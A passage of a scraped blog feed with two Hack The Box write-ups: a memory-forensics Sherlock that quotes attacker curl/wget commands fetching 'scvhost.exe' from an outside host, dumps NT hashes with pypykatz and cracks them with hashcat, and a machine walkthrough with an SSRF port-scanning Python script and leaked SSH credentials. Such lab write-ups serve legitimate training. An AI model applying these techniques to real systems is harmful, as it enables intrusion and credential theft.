n/a \\device\\harddiskvolume4\\windows\\system32\\conhost.exe \\??\\c:\\windows\\system32\\conhost.exe 0x4 c:\\windows\\system32\\conhost.exe now i found the process id and process name. please don\u0026rsquo;t be stupid like me. do a pstree and check for unusual/not-trusted-by-system directory for suspicious files. for example from a user\u0026rsquo;s home directory like downloads, documents, etc. you get the gist. if followed till now you will have the answers for tasks up to 4.\nfor, task 5 i struggled heavily. i dumped all the .evtx file from the memory converted it to json and tried find the 4104 event for powershell script block text. what a disaster!\ndump all the file with the extension .evtx\n$ vol3 -f memory_dump.vmem windows.dumpfiles --filter \u0026#34;.evtx$\u0026#34; after that if you try convert them using evtxecmd tool it won\u0026rsquo;t play nice. so, i batch renamed them in linux the thunar like file explorer gives you nice options to do this. then, i reran the evtx parser and compiled a single json file. then i did a lot of jq kung-fu didn\u0026rsquo;t find the command but i was able to uncover what kind of protocol it used, so that was helpful.\n$ cat 20240621161500_evtxecmd_output.json | jq \u0026#39;select(.eventid==4100)\u0026#39; | less { \u0026#34;payloaddata1\u0026#34;: \u0026#34;severity = warning\u0026#34;, \u0026#34;payloaddata2\u0026#34;: \u0026#34;command name: invoke-webrequest\u0026#34;, \u0026#34;payloaddata3\u0026#34;: \u0026#34;commandtype: cmdlet\u0026#34;, \u0026#34;payloaddata4\u0026#34;: \u0026#34;script name: \u0026#34;, \u0026#34;payloaddata5\u0026#34;: \u0026#34;hostapplication: c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe\u0026#34;, \u0026#34;payloaddata6\u0026#34;: \u0026#34;host name: consolehost\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;desktop-umncbe7\\\\bantingfg\u0026#34;, \u0026#34;mapdescription\u0026#34;: \u0026#34;executing pipeline\u0026#34;, \u0026#34;chunknumber\u0026#34;: 3, \u0026#34;computer\u0026#34;: \u0026#34;desktop-umncbe7\u0026#34;, \u0026#34;payload\u0026#34;: \u0026#34;{\\\u0026#34;eventdata\\\u0026#34;:{\\\u0026#34;data\\\u0026#34;:[{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;contextinfo\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34; severity = warning, host name = consolehost, host version = 5.1.17763.316, host id = 8fa103ce-0c44-43e0-ac8e-df87e2567d20, host application = c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\windowspowershell\\\\\\\\v1.0\\\\\\\\powershell.exe, engine version = 5.1.17763.316, runspace id = 64229a85-901b-4b7a-9eab-fa74e87d4707, pipeline id = 21, command name = invoke-webrequest, command type = cmdlet, script name = , command path = , sequence number = 15, user = desktop-umncbe7\\\\\\\\bantingfg, connected user = , shell id = microsoft.powershell, \\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;userdata\\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;payload\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;error message = the response content cannot be parsed because the internet explorer engine is not available, or internet explorer\u0026#39;s first-launch configuration is not complete. specify the usebasicparsing parameter and try again. , fully qualified error id = webcmdletiedomnotsupportedexception,microsoft.powershell.commands.invokewebrequestcommand, \\\u0026#34;}]}}\u0026#34;, \u0026#34;userid\u0026#34;: \u0026#34;s-1-5-21-3466369480-1315555486-2413066615-1002\u0026#34;, \u0026#34;channel\u0026#34;: \u0026#34;microsoft-windows-powershell/operational\u0026#34;, \u0026#34;provider\u0026#34;: \u0026#34;microsoft-windows-powershell\u0026#34;, \u0026#34;eventid\u0026#34;: 4100, \u0026#34;eventrecordid\u0026#34;: \u0026#34;42\u0026#34;, \u0026#34;processid\u0026#34;: 6772, \u0026#34;threadid\u0026#34;: 10680, \u0026#34;level\u0026#34;: \u0026#34;warning\u0026#34;, \u0026#34;keywords\u0026#34;: \u0026#34;0x0\u0026#34;, \u0026#34;sourcefile\u0026#34;: \u0026#34;.\\\\powershell_events\\\\file.0xc40aab362c20.0xc40aab0eada0.sharedcachemap.microsoft-windows-powershell%4operational.evtx.vacb.evtx.evtx\u0026#34;, \u0026#34;extradataoffset\u0026#34;: 0, \u0026#34;hiddenrecord\u0026#34;: false, \u0026#34;timecreated\u0026#34;: \u0026#34;2023-10-31t13:43:12.1648343+00:00\u0026#34;, \u0026#34;recordnumber\u0026#34;: 42 } i searched for invoke-webrequest with the attacker ip couldn\u0026rsquo;t found it until i dumped all the strings of the memdump and tried grep on \u0026ldquo;httx://192.168.157.151\u0026rdquo;.\nrunning strings on the memdump:\n$ strings memory_dump.vmem | grep \u0026#34;http://192.168.157.151\u0026#34; [33mhttp://192.168.157.151:8000/scvhost.exeee8000/scvhost.exenot curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe wget http://192.168.157.151:8000/scvhost.exe curl http://192.168.157.151:8000/scvhost.exe curl -l -o scvhost.exe http://192.168.157.151:8000/scvhost.exe curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe del .\\scvhost.exexe http://192.168.157.151:8000/scvhost.exeexemessagedetails } }manderrormessage\u0026#34;) { curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe curl -l -o scvhost.exe http://192.168.157.151:8000/scvhost.exe curl -l -o scvhost.exe http://192.168.157.151:8000/scvhost.exe wget http://192.168.157.151:8000/scvhost.exe curl http://192.168.157.151:8000/scvhost.exe curl -l -o scvhost.exe http://192.168.157.151:8000/scvhost.exe curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe one of them is the command the attacker ran to download the malware.\nat this point i saved the strings dump to a file. and began searching for 331 password required for which is the default authentication failure message for filezilla and mostly many of the ftp server or at least 530 error code.\n(not logged in) (192.168.157.151)\u0026gt; 331 password required for admin (not logged in) (192.168.157.151)\u0026gt; 331 password required for kalilinux123 (not logged in) (192.168.157.151)\u0026gt; 331 password required for kali for task 7 we can use a plugin called chromehistoryviewer and get all the browser history with a timeline in a csv file.\n$ vol -f memory_dump.vmem --profile=win10x64_17763 chromehistory --output=csv --output-file=history.csv from there we can find the last visited url by the ta.\nto get the password of the affected user (at first i thought ftp user ð), we can use a plugin called pypykatz it dumps the credentials from memory not just from registry hives, it does all.\n$ vol3 -f memory_dump.vmem pypykatz volatility 3 framework 2.7.1 error pypykatz : failed to prcess tspkg package! reason: page fault at entry 0x0 in table page directory credtype domainname username nthash lmhash shahash masterkey masterkey(sha1) key_guid password msv desktop-umncbe7 admin 3dbde697d71690a769204beb12283678 0d5399508427ce79556cda71918020c1e8d15b53 msv desktop-umncbe7 bantingfg 5a4a40e43197cd4dfb7c72e691536e92 7df220b7ed7bca82d3e170731b6cd86587101192 dpapi e26a2d47a3e4a33400614daff0d5e6a061200de1abd4056b8b658b44e18f1d1f8101cc04c8e5315952edd9bf32ee44c05b0bc3d99053cf375ddec2414930b79a d735c94c3064d338ef6e1a874780adfa4b4bfa41 21dfb24c-d9a1-4e46-bff2-ba98539b9768 msv desktop-umncbe7 admin 3dbde697d71690a769204beb12283678 0d5399508427ce79556cda71918020c1e8d15b53 dpapi 34d138d82127c75b238d8f414e98b48358b3a8880f43e2212c3bb172c823fbf2424351ee8ddc9e407f3e46629a022f65c313005f7ac94d0f5c059aebcad0c125 3c950963ae990a1118b279d0bcfb3f11b743a49f afc04938-bba9-4f5c-b9c3-e4b899cb27ee dpapi d55ecb922b0fd16d9af227c265059dc46192abfbf5c89339d1c5a432be47b963d1355bfbcaf9016956f9ac16b8f42c8b2d934b8c43fbb22d54f2292d593f3ecb f37d82960fd5a4c3feaa398fae970f4cb33a24b6 a7683077-63ed-4595-9bf2-e8f9d3bc2f3a msv desktop-umncbe7 admin 3dbde697d71690a769204beb12283678 0d5399508427ce79556cda71918020c1e8d15b53 dpapi 3d15d26f3532f6ca7567cc69cfa3e82507edea1ab0fcb4d8dbe87cc15c309e08cb16bfe596004904241d93b1c2631401dd49d150e9f47bdcf5b0429be90bc5c9 1dd83beebdd1a4cf6e8ac19d13ad0d84add78596 ddcc14de-a060-4863-ad1d-96fb7b555c99 dpapi 784504bf11d0066d4663c9967856053b47980657e18b4909828c8d0d0f66d3a9866566446ead1eba2554413ce0ee591da2588270d12725a2a849960ffb226ab8 2f988aa590011bebf9dc9db3e18a053356e6fb16 9f5bd34d-3191-4b45-a5b7-68bc8336dbea dpapi 2cf5018d1e054a01d4b908668e7082b6be4ce334d4d73b1eea67bd821010ee1638e56e2b57b45959e8ad5d4bc11c20e8d3dc8c883bc44a3ea631ff55a615dbdd 72ae3ff66d9014848ddac0c0aa1d01b1ee7d08f9 3918288f-2eb4-4d79-ba4a-d325164ebd87 dpapi a479224d253b2e7d5b8f2e56f0a8c427e3c6edf4742540a61999759f290cf909c0baabd9027eddfcc660d4f52320c2a42c81affd652932b5968b3f98b1bb357f 09ff221cfa897a19b8065495501a4d61885518ed e81493f9-1082-443b-8caf-e220f16e4ff5 dpapi 5df8b07e65ba2d80a81f93bbdc9fde08f203a0d00fc4999e999179e10616d716a954d6486408a11ec61ab3ad39af93a1e3a4d5652ad0251582f6878450f705a6 8d09e135aa13a8edbe3d94e0978c5c81ecd01071 8f367e09-0da5-4303-b810-8aef131b9b4c using the nt hash from the bantingfg i used hashcat to crack it. i mean i did it for the machines never for a sherlock that was a first.\n$ hashcat mellitus.hash ~/seclists/passwords/leaked-databases/rockyou.txt -m 1000 --show 3dbde697d71690a769204beb12283678:123 5a4a40e43197cd4dfb7c72e691536e92:flowers123 task 8 and 9 looks more like ctf challenges. to find the answers i read this article on ctftime and it gave me some hints.\nfirst i dumped the mspaint.exe\u0026rsquo;s memory using memdump plugin.\n$ vol -f memory_dump.vmem --profile=win10x64_17763 memdump -p 5116 --dump-dir . volatility foundation volatility framework 2.6.1 ************************************************************************ writing mspaint.exe [ 5116] to 5116.dmp then i renamed the 5116.dmp to 5116.data because of an issue with gimp. gimp does not load raw data without .data extension apparently.\nopening raw dump data with gimp\n$ gimp 5116.data i adjusted the height and width and most importantly the offset. before writing this writeup i found one in the yellow band. now it is in cyan band. don\u0026rsquo;t know what\u0026rsquo;s happening here.\nsummary it was tougher than other sherlocks i have solved. but, it was a medium difficulty rated on htb. this sherlock introduces a little bit ctf-ish style. i enjoyed it.\n","title":"HTB Sherlock Mellitus"},{"date":"2024-06-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-machines/editorial/","summary":"Editorial - HTB Recon Let\u0026rsquo;s start off by Nmap\u0026rsquo;ing the target.\nNmap # Nmap 7.94SVN scan initiated Tue Jun 18 07:58:25 2024 as: nmap -vvv -p 22,80 -sCV -oN nmap 10.","tags":["custom-web-app","cve-2022-24439","git","gitpython","htb","internal-service","leak","linux","machine","metasploit","port-scan","secret","ssrf","xspa"],"text":"editorial - htb recon let\u0026rsquo;s start off by nmap\u0026rsquo;ing the target.\nnmap # nmap 7.94svn scan initiated tue jun 18 07:58:25 2024 as: nmap -vvv -p 22,80 -scv -on nmap 10.129.49.40 nmap scan report for editorial.htb (10.129.49.40) host is up, received conn-refused (0.37s latency). scanned at 2024-06-18 07:58:25 +02 for 27s port state service reason version 22/tcp open ssh syn-ack openssh 8.9p1 ubuntu 3ubuntu0.7 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ecdsa) | ecdsa-sha2-nistp256 aaaae2vjzhnhlxnoytitbmlzdhayntyaaaaibmlzdhayntyaaabbbmapl7gtas1jlyvj1bwp3kpc6oxk6sp2jychm37ulgn+drz4kw2bbqo/yozkui+j1yma1wnysxv0ovyhjgejavm= | 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ed25519) |_ssh-ed25519 aaaac3nzac1lzdi1nte5aaaaimxtxit4zztgzx4222zer7f/kawwdcwm/rgzrrgvzhyx 80/tcp open http syn-ack nginx 1.18.0 (ubuntu) |_http-server-header: nginx/1.18.0 (ubuntu) |_http-title: editorial tiempo arriba | http-methods: |_ supported methods: options head get service info: os: linux; cpe: cpe:/o:linux:linux_kernel read data files from: /usr/bin/../share/nmap service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at tue jun 18 07:58:52 2024 -- 1 ip address (1 host up) scanned in 27.03 seconds http service the http://editorial.htb/upload looks interesting. there\u0026rsquo;s a field name called bookurl which accepts an url and tries to load the image when the preview button is clicked. it sends the following request.\npost /upload-cover http/1.1 host: editorial.htb user-agent: mozilla/5.0 (x11; linux aarch64; rv:109.0) gecko/20100101 firefox/115.0 accept: */* accept-language: en-us,en;q=0.5 accept-encoding: gzip, deflate, br content-type: multipart/form-data; boundary=---------------------------30720708513481866454123983682 content-length: 372 origin: http://editorial.htb connection: close referer: http://editorial.hrb/upload dnt: 1 sec-gpc: 1 -----------------------------30720708513481866454123983682 content-disposition: form-data; name=\u0026#34;bookurl\u0026#34; http://10.10.14.133:8000/aaa.jpeg -----------------------------30720708513481866454123983682 content-disposition: form-data; name=\u0026#34;bookfile\u0026#34;; filename=\u0026#34;\u0026#34; content-type: application/octet-stream -----------------------------30720708513481866454123983682-- the above request sends a get request to http://10.10.14.133:8000/aaa.jpeg.\n$ python3 -m http.server serving http on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.129.49.40 - - [18/jun/2024 08:07:01] \u0026#34;get /aaa.jpeg http/1.1\u0026#34; 200 - looks like it\u0026rsquo;s vulnerable to ssrf and we can read the data by visiting a temporary upload url. after this point, i tried to upload a shell but i couldn\u0026rsquo;t execute code on the server. also the temporary file was deleted between 1-2 minutes. so, i researched on ssrf and found an article discussing internal port scanning using ssrf called cross-site port attack(xspa).\nthen, i tried burp\u0026rsquo;s intruder but the scan time was very slow in the community edition. therefore, i wrote a custom python script to scan for ports and using the temporary file upload link we can grab the information about any possible hits.\nimport requests def discoverports(port): # url to which the request will be sent url = \u0026#39;http://editorial.htb/upload-cover\u0026#39; # files to be uploaded files = { \u0026#39;bookfile\u0026#39;: (\u0026#39;\u0026#39;, b\u0026#39;\u0026#39;, \u0026#39;application/octet-stream\u0026#39;) } # form data data = { \u0026#39;bookurl\u0026#39;: \u0026#39;http://127.0.0.1:\u0026#39; + port } # headers for the request headers = { \u0026#39;host\u0026#39;: \u0026#39;editorial.htb\u0026#39;, \u0026#39;user-agent\u0026#39;: \u0026#39;mozilla/5.0 (x11; linux aarch64; rv:109.0) gecko/20100101 firefox/115.0\u0026#39;, \u0026#39;accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;accept-language\u0026#39;: \u0026#39;en-us,en;q=0.5\u0026#39;, \u0026#39;accept-encoding\u0026#39;: \u0026#39;gzip, deflate, br\u0026#39;, \u0026#39;origin\u0026#39;: \u0026#39;http://editorial.htb\u0026#39;, \u0026#39;connection\u0026#39;: \u0026#39;close\u0026#39;, \u0026#39;referer\u0026#39;: \u0026#39;http://editorial.htb/upload\u0026#39;, \u0026#39;dnt\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;sec-gpc\u0026#39;: \u0026#39;1\u0026#39; } # send the post request with the files, form data, and headers response = requests.post(url, files=files, data=data, headers=headers) # print the response from the server if response.text != \u0026#39;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg\u0026#39;: print(\u0026#34;found something interesting on port: \u0026#34; + port) print(response.text) if response.text.startswith(\u0026#34;static/uploads/\u0026#34;): print(\u0026#34;getting the interesting file\u0026#34;) url = \u0026#39;http://editorial.htb/\u0026#39; + response.text print(url) res_secret = requests.get(url) if res_secret.status_code == 200: with open(\u0026#39;intresting-file.txt\u0026#39;,\u0026#39;wb\u0026#39;) as file: file.write(res_secret.text.encode()) return 1 print(\u0026#34;nothing found on port: \u0026#34; + port) return 0 def getendpointdata(endpoint): # url to which the request will be sent url = \u0026#39;http://editorial.htb/upload-cover\u0026#39; # files to be uploaded files = { \u0026#39;bookfile\u0026#39;: (\u0026#39;\u0026#39;, b\u0026#39;\u0026#39;, \u0026#39;application/octet-stream\u0026#39;) } # form data data = { \u0026#39;bookurl\u0026#39;: \u0026#39;http://127.0.0.1:5000\u0026#39; + endpoint } # headers for the request headers = { \u0026#39;host\u0026#39;: \u0026#39;editorial.htb\u0026#39;, \u0026#39;user-agent\u0026#39;: \u0026#39;mozilla/5.0 (x11; linux aarch64; rv:109.0) gecko/20100101 firefox/115.0\u0026#39;, \u0026#39;accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;accept-language\u0026#39;: \u0026#39;en-us,en;q=0.5\u0026#39;, \u0026#39;accept-encoding\u0026#39;: \u0026#39;gzip, deflate, br\u0026#39;, \u0026#39;origin\u0026#39;: \u0026#39;http://editorial.htb\u0026#39;, \u0026#39;connection\u0026#39;: \u0026#39;close\u0026#39;, \u0026#39;referer\u0026#39;: \u0026#39;http://editorial.htb/upload\u0026#39;, \u0026#39;dnt\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;sec-gpc\u0026#39;: \u0026#39;1\u0026#39; } # send the post request with the files, form data, and headers response = requests.post(url, files=files, data=data, headers=headers) # print the response from the server if response.text != \u0026#39;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg\u0026#39;: print(\u0026#34;found something interesting on endpoint: \u0026#34; + endpoint) print(response.text) if response.text.startswith(\u0026#34;static/uploads/\u0026#34;): print(\u0026#34;getting the interesting file\u0026#34;) url = \u0026#39;http://editorial.htb/\u0026#39; + response.text print(url) res_secret = requests.get(url) if res_secret.status_code == 200: filename = endpoint.split(\u0026#39;/\u0026#39;) filename = filename[len(filename)-1] with open(filename,\u0026#39;wb\u0026#39;) as file: file.write(res_secret.text.encode()) return 1 print(\u0026#34;nothing found on url: \u0026#34; + url) return 0 if __name__ == \u0026#39;__main__\u0026#39;: for i in range(3000, 10000): stop_flag = discoverports(str(i)) if stop_flag: break endpoints = [\u0026#34;/api/latest/metadata/messages/promos\u0026#34;, \u0026#34;/api/latest/metadata/messages/coupons\u0026#34;, \u0026#34;/api/latest/metadata/messages/authors\u0026#34;, \u0026#34;/api/latest/metadata/messages/how_to_use_platform\u0026#34;, \u0026#34;/api/latest/metadata/changelog\u0026#34;, \u0026#34;/api/latest/metadata\u0026#34;] for endpoint in endpoints: getendpointdata(endpoint) the script is a proof of concept and not refactored well but it gets the job done.\ni found a hit on port 5000 and the output looks like the following:\n{ \u0026#34;messages\u0026#34;: [ { \u0026#34;promotions\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;retrieve a list of all the promotions in our library.\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;/api/latest/metadata/messages/promos\u0026#34;, \u0026#34;methods\u0026#34;: \u0026#34;get\u0026#34; } }, { \u0026#34;coupons\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;retrieve the list of coupons to use in our library.\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;/api/latest/metadata/messages/coupons\u0026#34;, \u0026#34;methods\u0026#34;: \u0026#34;get\u0026#34; } }, { \u0026#34;new_authors\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;retrieve the welcome message sended to our new authors.\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;/api/latest/metadata/messages/authors\u0026#34;, \u0026#34;methods\u0026#34;: \u0026#34;get\u0026#34; } }, { \u0026#34;platform_use\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;retrieve examples of how to use the platform.\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;/api/latest/metadata/messages/how_to_use_platform\u0026#34;, \u0026#34;methods\u0026#34;: \u0026#34;get\u0026#34; } } ], \u0026#34;version\u0026#34;: [ { \u0026#34;changelog\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;retrieve a list of all the versions and updates of the api.\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;/api/latest/metadata/changelog\u0026#34;, \u0026#34;methods\u0026#34;: \u0026#34;get\u0026#34; } }, { \u0026#34;latest\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;retrieve the last version of api.\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;/api/latest/metadata\u0026#34;, \u0026#34;methods\u0026#34;: \u0026#34;get\u0026#34; } } ] } it seems there\u0026rsquo;s an internal api service running on port 5000. so i tried to get all the endpoints listed here. out of these 6 endpoints 3 of them returned 200 and json data.\nauthors\n{ \u0026#34;template_mail_message\u0026#34;: \u0026#34;welcome to the team! we are thrilled to have you on board and can\u0026#39;t wait to see the incredible content you\u0026#39;ll bring to the table.\\n\\nyour login credentials for our internal forum and authors site are:\\nusername: dev\\npassword: dev080217_devapi!@\\nplease be sure to change your password as soon as possible for security purposes.\\n\\ndon\u0026#39;t hesitate to reach out if you have any questions or ideas - we\u0026#39;re always here to support you.\\n\\nbest regards, editorial tiempo arriba team.\u0026#34; } changelog\n[ { \u0026#34;1\u0026#34;: { \u0026#34;api_route\u0026#34;: \u0026#34;/api/v1/metadata/\u0026#34;, \u0026#34;contact_email_1\u0026#34;: \u0026#34;soporte@tiempoarriba.oc\u0026#34;, \u0026#34;contact_email_2\u0026#34;: \u0026#34;info@tiempoarriba.oc\u0026#34;, \u0026#34;editorial\u0026#34;: \u0026#34;editorial el tiempo por arriba\u0026#34; } }, { \u0026#34;1.1\u0026#34;: { \u0026#34;api_route\u0026#34;: \u0026#34;/api/v1.1/metadata/\u0026#34;, \u0026#34;contact_email_1\u0026#34;: \u0026#34;soporte@tiempoarriba.oc\u0026#34;, \u0026#34;contact_email_2\u0026#34;: \u0026#34;info@tiempoarriba.oc\u0026#34;, \u0026#34;editorial\u0026#34;: \u0026#34;ed tiempo arriba\u0026#34; } }, { \u0026#34;1.2\u0026#34;: { \u0026#34;contact_email_1\u0026#34;: \u0026#34;soporte@tiempoarriba.oc\u0026#34;, \u0026#34;contact_email_2\u0026#34;: \u0026#34;info@tiempoarriba.oc\u0026#34;, \u0026#34;editorial\u0026#34;: \u0026#34;editorial tiempo arriba\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;/api/v1.2/metadata/\u0026#34; } }, { \u0026#34;2\u0026#34;: { \u0026#34;contact_email\u0026#34;: \u0026#34;info@tiempoarriba.moc.oc\u0026#34;, \u0026#34;editorial\u0026#34;: \u0026#34;editorial tiempo arriba\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;/api/v2/metadata/\u0026#34; } } ] coupons\n[ { \u0026#34;2anniversarytwoandfourread4\u0026#34;: { \u0026#34;contact_email_2\u0026#34;: \u0026#34;info@tiempoarriba.oc\u0026#34;, \u0026#34;valid_until\u0026#34;: \u0026#34;12/02/2024\u0026#34; } }, { \u0026#34;fresh11books230\u0026#34;: { \u0026#34;contact_email_2\u0026#34;: \u0026#34;info@tiempoarriba.oc\u0026#34;, \u0026#34;valid_until\u0026#34;: \u0026#34;31/11/2023\u0026#34; } } ] foothold i used the credential from the authors to try to ssh into the box and it worked.\ndev:dev080217_devapi!@ privilege escalation after, successfully getting dev\u0026rsquo;s ssh shell. let\u0026rsquo;s enumerate the target using linpeas.\ni found a vulnerable version of `screen v4.09.00` but the [exploit](https://www.exploit-db.com/exploits/51252) didn\u0026#39;t work. to exploit this we needed the `screen` to have setuid bit set by root. users that exist on the box. found a git initialized directory. after enumerating the apps folder with git i found some interesting commits.\n$ git log commit 8ad0f3187e2bda88bba85074635ea942974587e8 (head -\u0026gt; master) author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; date: sun apr 30 21:04:21 2023 -0500 fix: bugfix in api port endpoint commit dfef9f20e57d730b7d71967582035925d57ad883 author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; date: sun apr 30 21:01:11 2023 -0500 change: remove debug and update api port commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; date: sun apr 30 20:55:08 2023 -0500 change(api): downgrading prod to dev * to use development environment. commit 1e84a036b2f33c59e2390730699a488c65643d28 author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; date: sun apr 30 20:51:10 2023 -0500 feat: create api to editorial info * it (will) contains internal info about the editorial, this enable faster access to information. commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; date: sun apr 30 20:48:43 2023 -0500 feat: create editorial app * this contains the base of this project. * also we add a feature to enable to external authors send us their books and validate a future post in our editorial. the commit before change(api): downgrading prod to dev looks very interesting, it says it (will) contains internal info about the editorial, this enable faster access to information. let\u0026rsquo;s checkout the commit.\ndev@editorial:~/apps$ git checkout 1e84a036b2f33c59e2390730699a488c65643d28 d\tapp_editorial/static/css/bootstrap-grid.css d\tapp_editorial/static/css/bootstrap-grid.css.map d\tapp_editorial/static/css/bootstrap-grid.min.css d\tapp_editorial/static/css/bootstrap-grid.min.css.map d\tapp_editorial/static/css/bootstrap-grid.rtl.css d\tapp_editorial/static/css/bootstrap-grid.rtl.css.map d\tapp_editorial/static/css/bootstrap-grid.rtl.min.css d\tapp_editorial/static/css/bootstrap-grid.rtl.min.css.map d\tapp_editorial/static/css/bootstrap-reboot.css d\tapp_editorial/static/css/bootstrap-reboot.css.map d\tapp_editorial/static/css/bootstrap-reboot.min.css d\tapp_editorial/static/css/bootstrap-reboot.min.css.map d\tapp_editorial/static/css/bootstrap-reboot.rtl.css d\tapp_editorial/static/css/bootstrap-reboot.rtl.css.map d\tapp_editorial/static/css/bootstrap-reboot.rtl.min.css d\tapp_editorial/static/css/bootstrap-reboot.rtl.min.css.map d\tapp_editorial/static/css/bootstrap-utilities.css d\tapp_editorial/static/css/bootstrap-utilities.css.map d\tapp_editorial/static/css/bootstrap-utilities.min.css d\tapp_editorial/static/css/bootstrap-utilities.min.css.map d\tapp_editorial/static/css/bootstrap-utilities.rtl.css d\tapp_editorial/static/css/bootstrap-utilities.rtl.css.map d\tapp_editorial/static/css/bootstrap-utilities.rtl.min.css d\tapp_editorial/static/css/bootstrap-utilities.rtl.min.css.map d\tapp_editorial/static/css/bootstrap.css d\tapp_editorial/static/css/bootstrap.css.map d\tapp_editorial/static/css/bootstrap.min.css d\tapp_editorial/static/css/bootstrap.min.css.map d\tapp_editorial/static/css/bootstrap.rtl.css d\tapp_editorial/static/css/bootstrap.rtl.css.map d\tapp_editorial/static/css/bootstrap.rtl.min.css d\tapp_editorial/static/css/bootstrap.rtl.min.css.map d\tapp_editorial/static/images/login-background.jpg d\tapp_editorial/static/images/pexels-janko-ferlic-590493.jpg d\tapp_editorial/static/images/pexels-min-an-694740.jpg d\tapp_editorial/static/js/bootstrap.bundle.js d\tapp_editorial/static/js/bootstrap.bundle.js.map d\tapp_editorial/static/js/bootstrap.bundle.min.js d\tapp_editorial/static/js/bootstrap.bundle.min.js.map d\tapp_editorial/static/js/bootstrap.esm.js d\tapp_editorial/static/js/bootstrap.esm.js.map d\tapp_editorial/static/js/bootstrap.esm.min.js d\tapp_editorial/static/js/bootstrap.esm.min.js.map d\tapp_editorial/static/js/bootstrap.js d\tapp_editorial/static/js/bootstrap.js.map d\tapp_editorial/static/js/bootstrap.min.js d\tapp_editorial/static/js/bootstrap.min.js.map d\tapp_editorial/templates/about.html d\tapp_editorial/templates/index.html d\tapp_editorial/templates/upload.html note: switching to \u0026#39;1e84a036b2f33c59e2390730699a488c65643d28\u0026#39;. you are in \u0026#39;detached head\u0026#39; state. you can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch. if you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command. example: git switch -c \u0026lt;new-branch-name\u0026gt; or undo this operation with: git switch - turn off this advice by setting config variable advice.detachedhead to false head is now at 1e84a03 feat: create api to editorial info after, checking out that commit i found two folders app_api and app_editorial. the app_api was the app that leaked the credential for dev user and gave us foothold.\ndev@editorial:~/apps$ ls app_api app_editorial dev@editorial:~/apps$ cd app_ -bash: cd: app_: no such file or directory dev@editorial:~/apps$ cd app_api/ dev@editorial:~/apps/app_api$ ls app.py let\u0026rsquo;s see what\u0026rsquo;s inside the app.py file.\ndev@editorial:~/apps/app_api$ cat app.py # api (in development). # * to retrieve info about editorial import json from flask import flask, jsonify # ------------------------------- # app configuration # ------------------------------- app = flask(__name__) # ------------------------------- # global variables # ------------------------------- api_route = \u0026#34;/api/latest/metadata\u0026#34; api_editorial_name = \u0026#34;editorial tiempo arriba\u0026#34; api_editorial_email = \u0026#34;info@tiempoarriba.htb\u0026#34; # ------------------------------- # api routes # ------------------------------- # -- : home @app.route(\u0026#39;/api\u0026#39;, methods=[\u0026#39;get\u0026#39;]) def index(): data_editorial = { \u0026#39;version\u0026#39;: [{ \u0026#39;1\u0026#39;: { \u0026#39;editorial\u0026#39;: \u0026#39;editorial el tiempo por arriba\u0026#39;, \u0026#39;contact_email_1\u0026#39;: \u0026#39;soporte@tiempoarriba.oc\u0026#39;, \u0026#39;contact_email_2\u0026#39;: \u0026#39;info@tiempoarriba.oc\u0026#39;, \u0026#39;api_route\u0026#39;: \u0026#39;/api/v1/metadata/\u0026#39; }}, { \u0026#39;1.1\u0026#39;: { \u0026#39;editorial\u0026#39;: \u0026#39;ed tiempo arriba\u0026#39;, \u0026#39;contact_email_1\u0026#39;: \u0026#39;soporte@tiempoarriba.oc\u0026#39;, \u0026#39;contact_email_2\u0026#39;: \u0026#39;info@tiempoarriba.oc\u0026#39;, 